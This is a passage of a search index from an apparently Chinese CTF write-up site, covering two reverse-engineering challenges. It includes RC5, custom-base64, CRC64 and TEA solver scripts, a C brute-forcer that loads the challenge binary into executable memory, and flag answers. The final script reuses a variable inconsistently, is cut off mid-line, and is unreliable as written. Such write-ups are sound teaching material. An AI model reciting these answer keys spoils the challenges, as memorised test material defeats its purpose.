}","title":"\u89e3\u9898\u601d\u8def"},{"location":"201905/Reverse/#rcrcrcdondayoo-wp","text":"Linux \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u7a0b\u5e8f\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\uff0c\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\uff0c\u7a0b\u5e8f\u9000\u51fa\uff0cIDA64 \u6253\u5f00\u5206\u6790 main \u51fd\u6570\u4e2d\u6709 scanf \u548c\u51e0\u4e2a\u53d8\u91cf\u5b9a\u4e49\uff0c\u6700\u7ec8\u5224\u65ad\u56db\u4e2a\u53d8\u91cf\u503c\u662f\u5426\u6b63\u786e \u5148\u8fdb\u5165 400894 \u67e5\u770b \u5176\u4e2d ROL \u548c\u90e8\u5206\u53d8\u91cf\u7684\u540d\u5b57\u662f\u6211\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u70b9\u5f00 ROL \u5f88\u5bb9\u6613\u5206\u6790\u51fa\u8fd9\u662f\u5faa\u73af\u5de6\u79fb\u51fd\u6570 \u770b\u5230 \u8fd9\u6837\u7684\u7ed3\u6784\uff0c\u518d\u7ed3\u5408\u9898\u76ee\u540d\u5b57\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f\u4e00\u4e2a RC5 \u52a0\u5bc6\u7a0b\u5e8f\uff0c\u518d\u8fdb\u5165 4006FC \u67e5\u770b \u53ef\u4ee5\u786e\u5b9a\u662f RC5 \u52a0\u5bc6\uff0c\u4e00\u4e2a\u5206\u7ec4\u662f int\uff0c\u4e5f\u5c31\u662f 32 \u4f4d\uff0c\u505a 12 \u8f6e\u5faa\u73af\uff0c400894 \u662f\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\uff0c4006FC \u662f\u52a0\u5bc6\u51fd\u6570\uff0c\u9644\u4e24\u9875 ppt \u4f46\u4e0e\u4e00\u822c\u7684 RC5 \u4e0d\u540c\u7684\u662f\uff0c\u7a0b\u5e8f\u6bcf\u4e00\u8f6e\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\u662f\u4e00\u6837\u7684 \u5faa\u73af\u53d8\u91cf j \u4f5c\u4e3a\u5bc6\u94a5\u6570\u7ec4\u7d22\u5f15\uff0c\u6ca1\u6709\u4fee\u6539 \u8981\u8fdb\u884c\u89e3\u5bc6\uff0c\u9996\u5148\u8981\u83b7\u5f97\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\uff0c\u5728\u8fd9\u91cc\u65e0\u9700\u5bf9\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\u8fdb\u884c\u5206\u6790\uff0c\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4ece\u5185\u5b58 dump \u51fa\u5404\u4e2a\u5b50\u5bc6\u94a5\u5373\u53ef \u53ef\u4ee5\u5f97\u5230 4 \u4e2a\u5b50\u5bc6\u94a5 0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110 \u6309\u7167\u5bc6\u94a5\u7684\u4f7f\u7528\u987a\u5e8f\uff0c\u7f16\u5199\u89e3\u5bc6\u7a0b\u5e8f import libnum def ror ( num , d ): tmp = num >> ( d & 0x1f ) return tmp | (( num << ( 32 - ( d & 0x1f ))) & 2 ** 32 - 1 ) s = [ 0xd24aaa79 , 0x0bf82ac7 , 0xeb5a5436 , 0x04fc4110 ] cipher = [ 0xf4a956bf , 0xba568f3d , 0xd73a7f7c , 0x817f532b ] message = [] for r in range ( 0 , 3 , 2 ): ld = cipher [ r ] rd = cipher [ r + 1 ] for rnd in range ( 12 ): rd = ror (( rd - s [ r + 1 ]) & 2 ** 32 - 1 , ld ) ^ ld ld = ror (( ld - s [ r ]) & 2 ** 32 - 1 , rd ) ^ rd rd = ( rd - s [ 1 ]) & 2 ** 32 - 1 ld = ( ld - s [ 0 ]) & 2 ** 32 - 1 message . append ( libnum . n2s ( ld )) message . append ( libnum . n2s ( rd )) print ( message ) \u8fd0\u884c\u5f97\u5230 \u4f3c\u4e4e\u4e0d\u662f\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\uff0c\u4f46\u786e\u5b9e\u90fd\u843d\u5728 ASCII \u8303\u56f4\u5185\uff0c\u770b\u4e86\u534a\u5929\uff0c\u6ce8\u610f\u5230 linux \u662f\u5c0f\u7aef\u4f4d\u5e8f\uff0c\u8fd9\u4e2a\u7ed3\u679c\u4e5f\u662f\u5c0f\u7aef\u65b9\u5f0f\u8f93\u51fa\u7684\uff0c\u5b9e\u9645 flag \u5e94\u8be5\u5012\u8fc7\u6765 rc5_fking_boring","title":"rcrcrc(dondayoo~\u6218\u961f wp)"},{"location":"201905/Reverse/#baha","text":"","title":"baha"},{"location":"201905/Reverse/#_7","text":"base64 \u7b97\u6cd5\u9006\u5411 \u7206\u7834\u54c8\u5e0c\u7b97\u6cd5","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Reverse/#_8","text":"\u9996\u5148\u9006\u5411 base64\uff0c\u4f7f\u7528\u968f\u673a\u6570\u6253\u4e71\u4e86\u539f\u59cb\u7d22\u5f15\u8868\uff0c\u4f46\u662f\u968f\u673a\u6570\u7ed3\u679c\u4f7f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u751f\u6210\u7684\u65b0\u7d22\u5f15\u8868\u4e5f\u56fa\u5b9a\u3002 base64 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a key = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' T = 'kEjTmtB3VtHvgs51kl5v' b = '' for i in T : if i == '=' : b += '000000' break tmp = key . find ( i ) tmp = bin ( tmp )[ 2 :] if not len ( tmp ) == 0 : if len ( tmp ) < 6 : for _ in range ( 6 - len ( tmp )): b += '0' b += tmp j = 0 for i in range ( 0 , len ( b ), 8 ): print ( chr ( int ( b [ i : i + 8 ], 2 )), end = '' ) j += 1 \u7136\u540e\u662f\u7206\u7834\u8f93\u5165\u4e3a 9 \u4f4d\u6570\u5b57\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u5927\u4f6c\u4eec\u592a\u5f3a\u4e86\uff0c\u76f4\u63a5\u628a\u51fd\u6570\u590d\u539f\u4e86\uff0c\u9884\u671f\u89e3\u5982\u4e0b //#include \"stdafx.h\" #include <windows.h> #include <stdio.h> typedef __int64 ( * func )(); int main () { //char * hmod = (char *)LoadLibraryA(\"C:\\\\Users\\\\hgy\\\\Desktop\\\\hxb\\\\reverse_1\\\\reverse.exe\"); FILE * fp ; fp = fopen ( \"./baha.exe\" , \"rb\" ); size_t len = 0 ; fseek ( fp , 0 , SEEK_END ); len = ftell ( fp ); fseek ( fp , 0 , SEEK_SET ); char * hmod = ( char * ) VirtualAllocEx ( GetCurrentProcess (), 0 , len , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); fread ( hmod , len , 1 , fp ); func hash = ( func ) & hmod [ 0x560 ]; unsigned long long res ; char flag [ 0x30 ] = \"b@sE2019_scucs_\" ; for ( flag [ 15 ] = '0' ; flag [ 15 ] < '0' + 10 ; flag [ 15 ] ++ ) for ( flag [ 16 ] = '0' ; flag [ 16 ] < '0' + 10 ; flag [ 16 ] ++ ) for ( flag [ 17 ] = '0' ; flag [ 17 ] < '0' + 10 ; flag [ 17 ] ++ ) for ( flag [ 18 ] = '0' ; flag [ 18 ] < '0' + 10 ; flag [ 18 ] ++ ) { for ( flag [ 19 ] = '0' ; flag [ 19 ] < '0' + 10 ; flag [ 19 ] ++ ) for ( flag [ 20 ] = '0' ; flag [ 20 ] < '0' + 10 ; flag [ 20 ] ++ ) for ( flag [ 21 ] = '0' ; flag [ 21 ] < '0' + 10 ; flag [ 21 ] ++ ) for ( flag [ 22 ] = '0' ; flag [ 22 ] < '0' + 10 ; flag [ 22 ] ++ ) for ( flag [ 23 ] = '0' ; flag [ 23 ] < '0' + 10 ; flag [ 23 ] ++ ) { unsigned int addr = ( unsigned int ) flag ; __asm { mov ecx , addr } res = hash (); if ( res == 0x8181433626e17720 ) { printf ( \"found: %s\" , flag ); exit ( 0 ); } } printf ( \"%s -- %#llx \\n \" , flag , res ); } return 0 ; } \u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u662f\uff0c\u54c8\u5e0c\u51fd\u6570\u91c7\u7528_thiscall \u8c03\u7528\u7684\uff0c\u6240\u4ee5\u6211\u7528\u7684\u5185\u8054\u6c47\u7f16\u7ed9\u51fd\u6570\u4f20\u7684\u53c2\u6570\u3002\u4e0d\u8fc7\u5927\u4f6c\u4eec\u76f4\u63a5\u590d\u539f\u4e86\u51fd\u6570\uff0c\u4e5f\u5c31\u6ca1\u8fd9\u4e9b\u95ee\u9898\u4e86 2333.","title":"\u89e3\u9898\u601d\u8def"},{"location":"201905/Reverse/#bahadondayoo-wp","text":"Windows \u7a0b\u5e8f\uff0c\u8fd0\u884c\u770b\u770b \u4e24\u6bb5\u8f93\u5165\uff0c\u6709\u9519\u8bef\u63d0\u793a\uff0cIDA \u6253\u5f00\u5206\u6790 \u6ca1\u6709 main \u7b26\u53f7\uff0c\u641c\u7d22\u5b57\u7b26\u4e32 Welcome \u8fdb\u5165 main \u51fd\u6570\u67e5\u770b \u5176\u4e2d\u90e8\u5206\u53d8\u91cf\u540d\u548c\u51fd\u6570\u540d\u662f\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u7a0b\u5e8f\u9996\u5148\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u7b2c\u4e8c\u6b21\u8f93\u5165\u8fdb\u884c\u5224\u65ad\uff0c\u8fdb\u5165 check_is_number \u51fd\u6570\u67e5\u770b \u6bd4\u8f83\u660e\u663e\u7684\u662f\u4e0e 48+9=57\uff0c\u4e5f\u5c31\u662f\u20199\u2019\u7684 ASCII \u7801\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u51fd\u6570\u662f\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u5b57\u7b26\u4e32\uff0c\u4f46 strlen \u8fd8\u4e0d\u592a\u6e05\u6670 \u6ce8\u610f\u5230\u8fd9\u91cc\u7684\u53f3\u79fb 6 \u4f4d\uff0c&3F \u7b49\u64cd\u4f5c\uff0c\u518d\u7ed3\u5408 abcdefg \u53d8\u91cf \u80fd\u591f\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u800c \u5176\u4e2d\u7684\u5b57\u7b26\u4e32\u662f base64 \u7f16\u7801\u7684\u7ed3\u679c \u4f46\u662f\u76f4\u63a5\u53d6\u51fa\u6765\u8fdb\u884c base64 \u89e3\u7801\u53d1\u73b0\u5e76\u4e0d\u662f\u53ef\u8bfb\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5230 sub_401000() \u8fd9\u4e2a\u51fd\u6570\u5bf9 base64 \u7f16\u7801\u8868\u8fdb\u884c\u4e86\u6253\u4e71\uff0c\u4e0a\u52a8\u6001\u8c03\u8bd5\uff0c\u76f4\u63a5 dump \u51fa\u6253\u4e71\u7684\u7f16\u7801\u8868 \u7f16\u5199\u811a\u672c\uff0c\u67e5\u8868\u8fd8\u539f\u771f\u6b63\u7684 base64 \u7f16\u7801 origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) \u8fd9\u4e2a\u5c31\u662f\u7b2c\u4e00\u6b21\u8f93\u5165\u7684 name\uff0c\u63a5\u4e0b\u6765\u770b phone \u8fd9\u4e00\u6bb5\u5c06 name \u548c phone \u8fde\u63a5\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u603b\u957f\u5ea6\u662f 24\uff0c\u6240\u4ee5 phone \u7684\u957f\u5ea6\u5e94\u8be5\u662f 9 \u7136\u540e\u770b\u6700\u540e\u7684\u5224\u65ad \u8fdb\u5165\u51fd\u6570\u67e5\u770b \u51fd\u6570\u5185\u6709\u4e09\u6bb5\u5faa\u73af\uff0c\u7b2c\u4e00\u6bb5\u5faa\u73af\u662f 32 \u4f4d\u5e38\u91cf\u7684\u5f02\u6216\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u6bb5\u5faa\u73af\u662f\u67e5\u8868\u64cd\u4f5c\uff0c\u7b2c\u4e09\u6bb5\u5faa\u73af\u7279\u5f81\u6bd4\u8f83\u660e\u663e\uff0c\u6709>>5, \u00d716\uff0c\u4e5f\u5c31\u662f<<4 \u64cd\u4f5c\uff0c\u5e76\u4e14\u6709-0x61c88647= 0x9e3779b9 \u5e38\u91cf\uff0c\u662f\u4e00\u4e2a tea \u52a0\u5bc6 \u7ed3\u5408\u9898\u76ee\u540d\u5b57 baha\uff0cba \u5e94\u8be5\u4ee3\u8868 base64\uff0cha \u6211\u89c9\u5f97\u5e94\u8be5\u662f hash\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6bb5\u5faa\u73af\u5e94\u8be5\u662f\u4e00\u4e2a hash \u7b97\u6cd5\uff0c\u800c\u7528\u67e5\u8868\u65b9\u5f0f\u7684 hash \u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662f crc \u4e86\u3002\u4ed4\u7ec6\u5206\u6790\u4ee3\u7801\uff0c\u9996\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u4e0e\u521d\u59cb\u5bc4\u5b58\u5668\u5f02\u6216\u5f97\u5230\u7d22\u5f15\u503c\uff0c\u5bc4\u5b58\u5668\u53f3\u79fb 8 \u4f4d\u3002\u901a\u8fc7\u7d22\u5f15\u67e5\u8868\u5f97\u5230\u67d0\u4e2a\u503c\uff0c\u518d\u4e0e\u5bc4\u5b58\u5668\u5f02\u6216\uff0c\u5bc4\u5b58\u5668\u957f\u5ea6\u662f\u4e24\u4e2a\u53cc\u5b57\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u67e5\u8868\u6cd5 crc64 \u7b2c\u4e00\u6bb5\u5faa\u73af\u5c31\u662f\u751f\u6210\u8868\u7684\u64cd\u4f5c\uff0c\u540c\u6837\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d dump \u51fa\u8fd9\u5f20\u8868\u5373\u53ef \u6709\u4e86\u8868\u540e\uff0c\u9700\u8981\u9006\u5411\u6062\u590d\u51fa 9 \u4e2a\u5b57\u8282\u5185\u5bb9\uff0c\u56e0\u4e3a crc64 \u7684\u957f\u5ea6\u662f 8 \u5b57\u8282\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u53ea\u80fd\u731c\u6d4b\uff0c\u8303\u56f4\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u5728\u6570\u5b57\u5b57\u7b26\u8303\u56f4\u5185 \u6062\u590d\u7684\u65b9\u6cd5\u53c2\u8003\u4e86https://blog.csdn.net/dabang_007/article/details/48713659 \u56e0\u4e3a\u6b63\u5411\u8ba1\u7b97\u65f6\u5bc4\u5b58\u5668\u5148\u903b\u8f91\u53f3\u79fb 8 \u4f4d\uff0c\u518d\u4e0e\u4e00\u4e2a 8 \u5b57\u8282\u5f02\u6216\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u67e5\u8868\u5f97\u5230\u7684\u503c\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u7b49\uff0c\u5229\u7528\u8fd9\u4e2a\u53ef\u4ee5\u5f97\u5230\u8868\u4e2d\u8fd9\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002\u5f97\u5230\u7b2c\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u540e\uff0c\u5bc4\u5b58\u5668\u5148\u4e0e\u8fd9\u4e2a\u5b57\u5f02\u6216\uff0c\u518d\u5de6\u79fb 8 \u4f4d\uff0c\u7136\u540e\u91cd\u590d\u7b2c\u4e00\u6b21\u64cd\u4f5c\uff0c\u4e00\u5171\u53ef\u4ee5\u5f97\u5230 8 \u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002 \u6839\u636e\u8fd9\u4e9b\u7d22\u5f15\u53f7\uff0c\u904d\u5386\u6240\u6709\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u8fdb\u884c\u4e00\u6b21\u6b63\u5411\u8ba1\u7b97\uff0c\u7ea6\u675f\u540e\u516b\u4e2a\u5b57\u8282\u7684\u8f93\u5165\u5fc5\u987b\u4f7f\u5f97\u67e5\u8868\u65f6\u7684\u7d22\u5f15\u53f7\u662f\u6240\u671f\u671b\u7684\u503c\uff0c\u5c31\u80fd\u5f97\u5230\u6bcf\u4e00\u79cd\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165\u3002 Tea \u7684\u89e3\u5bc6\u6bd4\u8f83\u5bb9\u6613\uff0c\u5c06+\u6539\u4e3a-\uff0c\u987a\u5e8f\u8c03\u6362\u5373\u53ef\u3002 \u6700\u540e\u7f16\u5199\u811a\u672c origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) name = 'b@sE2019_scucs_' phone = '' num = '0123456789' data = [ 0 , 0 , 0x30358979 , 0x7AD870C8 , 0x606B12F2 , 0xF5B0E190 , 0x505E9B8B , 0x8F689158 , 0x9841B68F , 0xC038E573 , 0xA8743FF6 , 0xBAE095BB , 0xF82AA47D , 0x358804E3 , 0xC81F2D04 , 0x4F50742B , 0x6814FE75 , 0xAB28ECB4 , 0x5821770C , 0xD1F09C7C , 0x087FEC87 , 0x5E980D24 , 0x384A65FE , 0x24407DEC , 0xF05548FA , 0x6B1009C7 , 0xC060C183 , 0x11C8790F , 0x903E5A08 , 0x9EA0E857 , 0xA00BD371 , 0xE478989F , 0x88BE6F81 , 0x7D08FF3B , 0xB88BE6F8 , 0x07D08FF3 , 0xE8D57D73 , 0x88B81EAB , 0xD8E0F40A , 0xF2606E63 , 0x10FFD90E , 0xBD301A48 , 0x20CA5077 , 0xC7E86A80 , 0x7094CBFC , 0x4880FBD8 , 0x40A14285 , 0x32588B10 , 0xE0AA91F4 , 0xD620138F , 0xD09F188D , 0xACF86347 , 0x80C18306 , 0x2390F21F , 0xB0F40A7F , 0x594882D7 , 0x78EB277B , 0x1618F6FC , 0x48DEAE02 , 0x6CC08634 , 0x18803589 , 0xE3A8176C , 0x28B5BCF0 , 0x997067A4 , 0x117CDF02 , 0xFA11FE77 , 0x2149567B , 0x80C98EBF , 0x7117CDF0 , 0x0FA11FE7 , 0x41224489 , 0x75796F2F , 0x893D698D , 0x3A291B04 , 0xB908E0F4 , 0x40F16BCC , 0xE9567B7F , 0xCF99FA94 , 0xD963F206 , 0xB5418A5C , 0x79682177 , 0x513912C3 , 0x495DA80E , 0x2BE1620B , 0x19033385 , 0xA489F353 , 0x2936BAFC , 0xDE51839B , 0xE12997F8 , 0x9101F7B0 , 0xD11C1E81 , 0xEBD98778 , 0x8142850A , 0x64B11620 , 0xB1770C73 , 0x1E6966E8 , 0x99C2B083 , 0x8719014C , 0xA9F739FA , 0xFDC17184 , 0xF9A9A271 , 0x72A9E0DC , 0xC99C2B08 , 0x08719014 , 0x0183060C , 0x4721E43F , 0x31B68F75 , 0x3DF994F7 , 0x61E814FE , 0xB29105AF , 0x51DD9D87 , 0xC8497567 , 0xF1D64EF6 , 0x2C31EDF8 , 0xC1E3C78F , 0x56E99D30 , 0x91BD5C04 , 0xD9810C68 , 0xA188D57D , 0xA3597CA0 , 0x6997F879 , 0xEC09088B , 0x59A27100 , 0x96D17843 , 0x09FCEA8B , 0x19B9E91B , 0x39C963F2 , 0x636199D3 , 0x7A6E2D6F , 0xDF7ADABD , 0x4A5BA416 , 0xA5A2AA75 , 0x1A053F9D , 0x2ACA3B2D , 0x2A30B6E4 , 0x50124BE5 , 0xE22F9BE0 , 0x1F423FCE , 0xD21A1299 , 0x659A4F06 , 0x82448912 , 0xEAF2DE5E , 0xB271006B , 0x902AAE96 , 0x127AD31A , 0x74523609 , 0x224F5A63 , 0x0E8A46C1 , 0x7211C1E8 , 0x81E2D799 , 0x42244891 , 0xFB3AA751 , 0x8A3B6595 , 0xB46AD37A , 0xBA0EECEC , 0xCEB2A3B2 , 0xEA507767 , 0x41DA32EA , 0xDA65FE1E , 0x3B024222 , 0xF2D042EE , 0xA2722586 , 0xC2E5CB97 , 0xD8AA554E , 0x92BB501C , 0x57C2C416 , 0xA28ED965 , 0x2D1AB4DE , 0x6A91F461 , 0x624AC0F5 , 0x5AA47D18 , 0x1892B03D , 0x0AFAE693 , 0x97FA2165 , 0x3ACF6FEA , 0xED2251AD , 0x9AC4BC9B , 0x095AC932 , 0xAAF135E2 , 0x7382B9FA , 0xFAAFAE69 , 0xFCEA28A2 , 0xCA9A2710 , 0x8632586A , 0x02850A14 , 0xC9622C41 , 0x32B0836D , 0xB3BA5C89 , 0x62EE18E6 , 0x3CD2CDD1 , 0x52DB919F , 0x460ABD19 , 0x6B12F26D , 0x256B24CA , 0x5B277B14 , 0x5FB35402 , 0x0B79E09F , 0xD0DBC55A , 0x3B4C69E6 , 0xAA03B592 , 0xF35344E2 , 0xE553C1B9 , 0xC366CD9B , 0x9F8BB171 , 0x93385610 , 0x10E32029 , 0xA30DDF69 , 0x6A3B50E1 , 0x03060C18 , 0x8E43C87E , 0x33338561 , 0xF49BB8B6 , 0x636D1EEA , 0x7BF329EE , 0x53589793 , 0x012B5926 , 0x9B47BA97 , 0x4E7B2D0D , 0xAB7233EE , 0x34A35DC5 , 0xFB2CA865 , 0xBBCBCC9D , 0xCB19211C , 0xC113BC55 , 0xE3AC9DEC , 0x5863DBF1 , 0xD3991495 , 0x22BBAB39 , 0x83C78F1E , 0xADD33A61 , 0xB3F20667 , 0xD70B4AA9 , 0x7BED2B63 , 0x985B3E82 , 0x4BD8A21A , 0xE2834E4A , 0x1B863991 , 0x6DEBDF12 , 0x2BB3B0E8 , 0x1733AFDA , 0x8BB86399 , 0xF34B3745 , 0xBB8DEAE0 , 0x8993478D , 0xEBD3716B , 0x06FBD6D5 , 0xDBE6F812 , 0x7C23A61D , 0x13F9D516 , 0x3373D236 , 0x23CC5C6F , 0x49ABA2FE , 0x7392C7E4 , 0xC6C333A6 , 0x43A74E9D , 0xBC1B436E , 0xAC4BC9B5 , 0x95AC9329 , 0x9C7E40CC , 0xEF74E3E1 , 0xCC20DB47 , 0x601C72B9 , 0xFC15523E , 0x1AC40271 , 0x340A7F3A , 0x5594765A , 0x043FF643 , 0x2F4C0692 , 0x54616DC8 , 0xA02497CA , 0x6454E4B1 , 0xDAFCE702 , 0xC45F37C0 , 0x3E847F9D , 0xF46ABEB9 , 0x445C0F55 , 0xA4342532 , 0xCB349E0D , 0x9401AC4B , 0xB1ECEEC5 , 0x5C1E814F , 0xFEBC9AEE , 0x6C2B0836 , 0x8464EA26 , 0x3C7593BD , 0x0B0C7B7E , 0x0C401AC4 , 0x71D40BB6 , 0x24F5A634 , 0xE8A46C12 , 0x14C02F4D , 0x927C1CDA , 0x449EB4C6 , 0x1D148D82 , 0x74AB3DBF , 0x67CCFD4A , 0xBCB410BB , 0x289C8961 , 0x8C8199C2 , 0x5244F9A9 , 0xDCDF0249 , 0xDD2C68F1 , 0xECEA8B30 , 0xA7F41839 , 0x4CE15841 , 0x438C80A6 , 0x7CD4D138 , 0x3954F06E , 0x2C8A4AB3 , 0xB63C6136 , 0x1CBFC3CA , 0xCCE411FE , 0xD4A0EECE , 0x83B465D5 , 0xE49567B7 , 0xF96C151D , 0xB4CBFC3C , 0x76048445 , 0x84FE7545 , 0x0CDCF48D , 0xBD3716B7 , 0x6FBD6D5E , 0x8D029FCE , 0x15651D96 , 0xDD5C0445 , 0x9A0D8CCE , 0xED698D3C , 0xE0D5FC06 , 0x2576A038 , 0xAF85882D , 0x15432941 , 0xD55DF8E5 , 0x451DB2CA , 0x5A3569BD , 0x75283BB3 , 0x20ED1975 , 0xD523E8C2 , 0xC49581EA , 0xE51661BB , 0xBE4DF122 , 0xB548FA30 , 0x3125607A , 0x857D7349 , 0x4BFD10B2 , 0x4D625E4D , 0x04AD6499 , 0x7D57D734 , 0x7E751451 , 0x2D094CBF , 0xF11D8509 , 0x1D3CC5C6 , 0x8BC5F5C1 , 0x35897936 , 0x12B59265 , 0x05BCF04F , 0x686DE2AD , 0x55E26BC4 , 0xE70573F5 , 0x65D7E2BD , 0x9DDD033D , 0xADC8CFB9 , 0xD28D7716 , 0x9DFD46C0 , 0xA85507DE , 0xCDA3DD4B , 0x273D9686 , 0xFD965432 , 0x5DE5E64E , 0x5D9D8743 , 0xB99D7ED1 , 0x6DA80E3A , 0xC3450E19 , 0x3DF695B1 , 0x4C2D9F41 , 0x0DC31CC8 , 0x36F5EF89 , 0xC5DC31CC , 0x79A59BA2 , 0xF5E9B8B5 , 0x037DEB6A , 0xA5B7233E , 0x8C157A32 , 0x9582AA47 , 0xF6CD0AFA , 0xD625E4DA , 0x4AD64994 , 0xE6106DA3 , 0x300E395C , 0xB64EF628 , 0xBF66A804 , 0x867B7F51 , 0xC5BED8CC , 0x4E645255 , 0x8AEEACE7 , 0x7E51DB2C , 0xF036DC2F , 0x2E0F40A7 , 0x7F5E4D77 , 0x1E3AC9DE , 0x05863DBF , 0xBE311AAF , 0xE1FEA520 , 0x8E0493D6 , 0x9B26D5E8 , 0xDE5A085D , 0x144E44B0 , 0xEE6F8124 , 0x6E963478 , 0x2670AC20 , 0x21C64053 , 0x16452559 , 0x5B1E309B , 0x461BBED2 , 0xD476A1C3 , 0x762E37AB , 0xAEAED10B , 0x5E9B8B5B , 0x37DEB6AF , 0x6EAE0222 , 0x4D06C667 , 0x3EF099A9 , 0xC26E573F , 0x0EC510D0 , 0xB8B627F7 , 0xC6DA3DD4 , 0xF7E653DC , 0xF6EFB4AD , 0x8D3E2314 , 0xA6B12F26 , 0x0256B24C , 0x9684A65F , 0x788EC284 , 0x368F752E , 0x9CF65A1B , 0x06BAFC57 , 0xE62E2AD3 , 0x56E467DC , 0x6946BB8B , 0x66D1EEA5 , 0x139ECB43 , 0xAECEC3A1 , 0x5CCEBF68 , 0x9EFB4AD8 , 0x2616CFA0 , 0xCEA5D153 , 0xA97E5EF8 , 0xFE90582A , 0xD3A62E30 , 0xC7593BD8 , 0xB0C7B7E3 , 0xF76CB2A1 , 0xCA1FC72B , 0xA732292A , 0x45775673 , 0x9707A053 , 0x3FAF26BB , 0x5F188D57 , 0x70FF5290 , 0x6F2D042E , 0x0A272258 , 0x3F739FA5 , 0x854FB300 , 0x0F4616DC , 0xFF97C3C8 , 0xAF4DC5AD , 0x1BEF5B57 , 0x9F784CD4 , 0x61372B9F , 0xCF26D75F , 0xEE5FBAC7 , 0xFF135E26 , 0x9487CA0F , 0x370C7322 , 0xDBD7BE24 , 0x0739FA5B , 0xA10FCEEC , 0x576761D0 , 0x2E675FB4 , 0x6752E8A9 , 0x54BF2F7C , 0x4FE75459 , 0xCDCF48D8 , 0x7FD2DD20 , 0xB7173810 , 0x2F8C46AB , 0x387FA948 , 0x1FB9CFD2 , 0x42A7D980 , 0xD7A6E2D6 , 0x0DF7ADAB , 0xE7936BAF , 0x772FDD63 , 0xB7CDF024 , 0xF8474C3B , 0x87F8795D , 0x829F3CF3 , 0x27F3AA2C , 0x66E7A46C , 0x17C62355 , 0x1C3FD4A4 , 0x4798B8DE , 0x935745FC , 0x77AD31A7 , 0xE98F3534 , 0xBFB21CA3 , 0xA6DF411F , 0x8F8795DA , 0xDC0731D7 , 0xDFD90E51 , 0x536FA08F , 0xEFEC8728 , 0x29B7D047 ] k = [ 0x2175da3a , - 0x4c241d25 , 0x149b411 , - 0x2b15395b ] delta = 0x9e3779b9 summary = 0xc6ef3720 result = [ 0x26e17720 , 0x81814336 ] for r in range ( 32 ): result [ 1 ] -= (( summary + result [ 0 ]) & 0xffffffff ) ^ ((( result [ 0 ] >> 5 ) - 0x2b15395b ) & 0xffffffff ) ^ ((( result [ 0 ] << 4 ) + 0x149b411 ) & 0xffffffff ) result [ 1 ] &= 0xffffffff result [ 0 ] -= (( summary + result [ 1 ]) & 0xffffffff ) ^ ((( result [ 1 ] >> 5 ) - 0x4c241d25 ) & 0xffffffff ) ^ ((( result [ 1 ] << 4 ) + 0x2175da3a ) & 0xffffffff ) result [ 0 ] &= 0xffffffff summary -= delta print ( 'ans=' , map ( hex , result )) for ch in name : v14 = origin [ 0 ] ^ ord ( ch ) index = 2 * ( v14 & 0xff ) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'origin=' , map ( hex , origin )) blks = [] for r in range ( 8 ): e = result [ 1 ] & 0xff000000 for i in range ( len ( data )): if e == data [ i ] & 0xff000000 and i % 2 == 1 : blks . append ( i ) result [ 1 ] = (((( result [ 1 ] ^ data [ i ])) << 8 ) & 0xffffffff ) print ( map ( 